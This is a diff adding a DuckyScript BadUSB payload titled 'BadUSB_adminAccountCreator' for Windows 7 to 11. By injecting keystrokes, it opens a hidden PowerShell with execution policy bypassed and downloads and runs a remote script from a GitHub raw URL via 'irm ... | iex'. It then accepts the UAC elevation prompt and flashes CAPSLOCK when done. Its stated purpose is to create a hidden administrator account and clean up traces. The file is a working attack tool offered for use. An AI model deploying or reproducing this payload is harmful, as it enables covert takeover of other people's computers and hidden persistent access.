@@ -1,0 +1,47 @@
+REM                      _                        
+REM  _   _  ___  _   _  | | ___ __   _____      __
+REM | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+REM | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+REM  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+REM  |___/                                        
+
+REM #######################################################
+REM #                                                     |
+REM # Title        : BadUSB_adminAccountCreator           |
+REM # Author       : you.know                             |
+REM # Version      : 1.0                                  |
+REM # Category     : Credentials                          |
+REM # Target       : Windows 7/8/10/11                    |
+REM # Details      : Opens powershell hidden, creates a   |
+REM #                hidden admin user. Then it cleans up |
+REM #                traces                               |
+REM #                                                     |
+REM #######################################################
+
+REM Initial delay to ensure the system is ready
+DELAY 2500
+
+REM Minimize all active windows
+GUI d
+DELAY 500
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Execute PowerShell hidden with administrative privileges
+STRING powershell -w h -NoP -Ep Bypass -Command "irm https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_adminAccountCreator/refs/heads/main/script.ps1 | iex"
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+
+REM Flash CAPSLOCK as an indicator that execution is complete
+CAPSLOCK
+DELAY 500
+CAPSLOCK
+DELAY 500
+CAPSLOCK
+DELAY 500
+CAPSLOCK
